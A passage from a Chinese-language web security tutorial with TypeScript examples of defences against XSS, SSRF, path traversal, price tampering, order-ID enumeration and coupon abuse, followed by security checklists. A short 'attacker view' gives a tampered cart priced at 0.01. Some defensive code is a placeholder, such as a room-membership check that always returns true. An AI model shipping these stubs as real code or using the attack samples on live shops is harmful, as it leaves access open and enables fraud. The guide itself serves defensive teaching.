  const errors = validateComment(req.body);
  if (errors.length > 0) {
    return res.status(400).json({ errors });
  }

  // 2. 净化内容
  const cleanContent = purify.sanitize(req.body.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target'],
  });

  // 3. 存储
  const comment = {
    postId: req.params.id,
    content: cleanContent,
    authorId: req.user.id,
    createdAt: new Date(),
  };

  // 4. 返回
  res.json({ success: true, comment });
});

// === 防御 2: CSRF 保护 (已应用) ===
// 所有修改操作都经过 csrfProtection 中间件

// === 防御 3: SSRF 防护 ---

const validateAvatarUrl = async (url: string): Promise<boolean> => {
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) return false;

    // 仅允许特定图片 CDN
    const allowedDomains = ['imgur.com', 'i.imgur.com', 'cdn.blog.com'];
    if (!allowedDomains.includes(parsed.hostname)) return false;

    // DNS 检查
    const addresses = await resolve4(parsed.hostname);
    const isInternal = addresses.some((addr) =>
      /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|169\.254\.)/.test(addr)
    );
    return !isInternal;
  } catch {
    return false;
  }
};

router.put('/api/user/avatar', csrfProtection(csrfManager), async (req, res) => {
  const { avatarUrl } = req.body;

  if (!(await validateAvatarUrl(avatarUrl))) {
    return res.status(400).json({ error: 'Invalid avatar URL' });
  }

  // 更新头像
  res.json({ success: true });
});

// === 防御 4: 路径遍历防护 ---

router.get('/api/posts/:id/attachment/:filename', (req, res) => {
  const filename = path.basename(req.params.filename);
  const postsDir = path.resolve('/data/posts');
  const filePath = path.resolve(postsDir, req.params.id, 'attachments', filename);

  if (!filePath.startsWith(path.resolve(postsDir, req.params.id) + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  res.sendFile(filePath);
});

export default router;
```

### 6.2 场景 2: 电商平台安全加固

```typescript
// --- 攻击者视角: 电商平台攻击向量 ---

// === 攻击 1: 价格篡改 (客户端修改) ===
// 攻击者修改前端 JS，将价格改为 0.01
const maliciousCart = {
  items: [
    { productId: 'iphone-15', quantity: 1, price: 0.01 },  // 原价 $999
  ],
};

// === 攻击 2: 水平越权 (访问他人订单) ===
// 攻击者遍历订单 ID: /api/orders/1, /api/orders/2, ...

// === 攻击 3: 批量请求 (价格欺诈) ===
// 并发多个请求同时使用优惠券

// --- 防御者视角: 完整防御 ---

// === 防御 1: 服务端价格校验 ===

router.post('/api/orders', csrfProtection(csrfManager), async (req, res) => {
  const { items } = req.body;

  // 从数据库获取真实价格
  const productIds = items.map((item) => item.productId);
  const products = await ProductModel.find({ _id: { $in: productIds } });

  const priceMap = new Map();
  for (const product of products) {
    priceMap.set(product._id.toString(), product.price);
  }

  // 校验价格
  let totalAmount = 0;
  for (const item of items) {
    const realPrice = priceMap.get(item.productId);
    if (!realPrice) {
      return res.status(400).json({ error: `Product ${item.productId} not found` });
    }
    if (Math.abs(item.price - realPrice) > 0.01) {
      console.warn(
        `[Security] Price mismatch for ${item.productId}: ` +
        `client=${item.price}, server=${realPrice}`
      );
      return res.status(400).json({ error: 'Price verification failed' });
    }
    totalAmount += realPrice * item.quantity;
  }

  // 创建订单 (使用服务端计算的价格)
  const order = await OrderModel.create({
    userId: req.user.id,
    items: items.map((item) => ({
      productId: item.productId,
      quantity: item.quantity,
      price: priceMap.get(item.productId),  // 使用服务端价格
    })),
    totalAmount,
  });

  res.json({ success: true, orderId: order._id });
});

// === 防御 2: 垂直/水平越权防护 ===

// 所有权检查中间件
function requireOwnership(resourceType: string) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const resourceId = req.params.id;
    const userId = req.user.id;

    const resource = await getResourceById(resourceType, resourceId);

    if (!resource) {
      return res.status(404).json({ error: 'Resource not found' });
    }

    if (resource.userId !== userId) {
      console.warn(
        `[Security] Authorization attempt: ` +
        `user=${userId} tried to access ${resourceType}=${resourceId}`
      );
      return res.status(403).json({ error: 'Access denied' });
    }

    next();
  };
}

// 使用
router.get('/api/orders/:id', authMiddleware, requireOwnership('order'), (req, res) => {
  res.json({ order: req.resource });
});

// === 防御 3: 防重放 + 速率限制 ===

import rateLimit from 'express-rate-limit';

const orderLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 分钟
  max: 5,               // 最多 5 次下单
  message: { error: 'Too many orders' },
  keyGenerator: (req) => req.user.id,
});

router.post('/api/orders', authMiddleware, orderLimiter, csrfProtection(csrfManager), (req, res) => {
  // 下单逻辑
});

// === 防御 4: 优惠券防刷 ===

const couponLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 3,
  message: { error: 'Too many coupon attempts' },
  keyGenerator: (req) => `${req.user.id}:${req.body.couponCode}`,
});

router.post('/api/coupons/apply', authMiddleware, couponLimiter, async (req, res) => {
  const { couponCode, orderId } = req.body;

  // 检查优惠券是否已被使用
  const usedCount = await CouponUsageModel.countDocuments({
    userId: req.user.id,
    couponCode,
    createdAt: { $gte: new Date(Date.now() - 24 * 60 * 60 * 1000) },
  });

  if (usedCount >= 1) {
    return res.status(400).json({ error: 'Coupon already used' });
  }

  // 应用优惠券
  res.json({ success: true, discount: 50 });
});
```

### 6.3 场景 3: 实时聊天应用安全

```typescript
// --- File: src/security/chat-security.ts ---

/**
 * 实时聊天应用安全方案
 * WebSocket + 消息安全
 */

import { Server } from 'socket.io';

class ChatSecurity {
  private io: Server;
  private messageRateLimit: Map<string, { count: number; resetTime: number }>;

  constructor(io: Server) {
    this.io = io;
    this.messageRateLimit = new Map();
  }

  /**
   * WebSocket 认证中间件
   */
  authMiddleware(socket: any, next: (err?: Error) => void) {
    const token = socket.handshake.auth.token;

    if (!token) {
      return next(new Error('Authentication required'));
    }

    try {
      const decoded = this.verifyToken(token);
      socket.user = decoded;
      next();
    } catch {
      next(new Error('Invalid token'));
    }
  }

  /**
   * 消息速率限制
   */
  checkRateLimit(userId: string): boolean {
    const now = Date.now();
    const limit = this.messageRateLimit.get(userId);

    if (!limit || now > limit.resetTime) {
      this.messageRateLimit.set(userId, { count: 1, resetTime: now + 60000 });
      return true;
    }

    if (limit.count >= 30) {  // 每分钟 30 条消息
      return false;
    }

    limit.count++;
    return true;
  }

  /**
   * 消息内容安全
   */
  sanitizeMessage(content: string): string {
    // 1. 长度限制
    if (content.length > 5000) {
      content = content.slice(0, 5000);
    }

    // 2. HTML 净化
    content = purify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'code', 'br'],
      ALLOWED_ATTR: [],
    });

    // 3. URL 安全
    content = content.replace(
      /(https?:\/\/[^\s]+)/g,
      (url) => {
        try {
          const parsed = new URL(url);
          if (!['http:', 'https:'].includes(parsed.protocol)) {
            return '#';
          }
          return `<a href="${escapeAttr(url)}" target="_blank" rel="noopener">${escapeHtml(url)}</a>`;
        } catch {
          return escapeHtml(url);
        }
      }
    );

    return content;
  }

  /**
   * 设置聊天安全
   */
  setup() {
    this.io.use((socket: any, next) => this.authMiddleware(socket, next));

    this.io.on('connection', (socket: any) => {
      const userId = socket.user.id;

      socket.on('message', (data: { roomId: string; content: string }) => {
        // 1. 速率限制
        if (!this.checkRateLimit(userId)) {
          socket.emit('error', { message: 'Rate limit exceeded' });
          return;
        }

        // 2. 内容净化
        const cleanContent = this.sanitizeMessage(data.content);

        // 3. 房间权限检查
        if (!this.isUserInRoom(userId, data.roomId)) {
          socket.emit('error', { message: 'Not authorized' });
          return;
        }

        // 4. 广播消息
        this.io.to(data.roomId).emit('message', {
          id: crypto.randomUUID(),
          userId,
          content: cleanContent,
          timestamp: Date.now(),
        });
      });

      socket.on('disconnect', () => {
        this.messageRateLimit.delete(userId);
      });
    });
  }

  private verifyToken(token: string): any {
    // JWT 验证
    return null;
  }

  private isUserInRoom(userId: string, roomId: string): boolean {
    return true;
  }
}
```

---

## 7. 安全架构 Checklist <a id="7-安全架构-checklist"></a>

### 7.1 前端安全 Checklist

```
□ HTML 输出: 所有用户输入使用 textContent 或转义
□ 富文本: 使用 DOMPurify 净化
□ URL: 协议白名单校验
□ CSS: 值白名单 + 属性白名单
□ JavaScript: 禁止 eval/new Function/setTimeout(string)
□ innerHTML: 避免使用，必须使用时先 sanitize
□ document.write: 禁止使用
□ CSP: 配置 Content-Security-Policy 头
□ CSRF Token: 所有修改请求携带
□ Cookie: HttpOnly + Secure + SameSite
□ CORS: 最小化允许源
□ 依赖: 定期扫描漏洞 (npm audit)
□ 第三方脚本: Subresource Integrity (SRI)
```

### 7.2 后端安全 Checklist

```
□ 输入验证: 所有输入验证类型/格式/范围
□ SQL: 参数化查询 (禁止字符串拼接)
□ 认证: JWT/Session + 密码哈希 (bcrypt/argon2)
□ 授权: RBAC/ABAC + 资源所有权检查
□ CSRF: Token + SameSite Cookie
□ 速率限制: API 限流
□ CORS: 最小化配置
□ 错误处理: 不泄露敏感信息
□ 日志: 记录安全事件 (不记录密码/token)
□ 文件上传: 类型校验 + 大小限制 + 重命名
□ 路径: 禁止路径遍历
□ 依赖: 定期更新 + 漏洞扫描
□ 环境变量: 敏感配置使用环境变量
□ HTTPS: 全站 HTTPS + HSTS
```

### 7.3 安全 Headers Checklist

```javascript
// 完整安全 Headers 配置
const securityHeaders = {
  // XSS 防护
  'X-Content-Type-Options': 'nosniff',
  // 点击劫持防护
  'X-Frame-Options': 'DENY',
  // XSS 过滤器 (旧浏览器)
  'X-XSS-Protection': '0',  // 现代浏览器用 CSP 替代
  // 引荐策略
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  // 权限策略
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
  // CSP
  'Content-Security-Policy': 'default-src \'self\'; ...',
  // HSTS
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
};
```

### 7.4 安全测试 Checklist

```
□ XSS: 测试所有输入点 (表单/URL/Header/Cookie)
□ CSRF: 测试所有修改操作
□ SQL 注入: 测试所有数据库查询
□ 认证绕过: 测试登录/注册/密码重置
□ 授权绕过: 测试水平/垂直越权
□ 文件上传: 测试类型/大小/内容
□ 路径遍历: 测试文件访问
□ SSRF: 测试 URL 请求
□ 速率限制: 测试 API 限流
□ 敏感数据: 检查日志/错误信息/响应头
□ 依赖漏洞: npm audit / Snyk
□ 配置安全: 检查生产配置
```

---

## 附录: 安全资源

### 推荐工具
- **DOMPurify**: HTML 净化
- **Helmet.js**: Express 安全 Headers
- **express-rate-limit**: 速率限制
- **csurf**: CSRF 保护
- **validator.js**: 输入验证
- **bcrypt**: 密码哈希
- **jsonwebtoken**: JWT 认证
- **npm audit**: 依赖漏洞扫描
- **Snyk**: 安全扫描平台
- **OWASP ZAP**: 漏洞扫描

### 参考标准
- **OWASP Top 10**: 十大 Web 安全风险
- **CSP Level 3**: 内容安全策略规范
- **RFC 6265**: HTTP Cookie 规范
- **OWASP Cheat Sheet Series**: 安全速查表

---

_安全不是一次性的任务，而是持续的过程。每次代码审查都问一句: "如果这是用户输入，会发生什么？"_
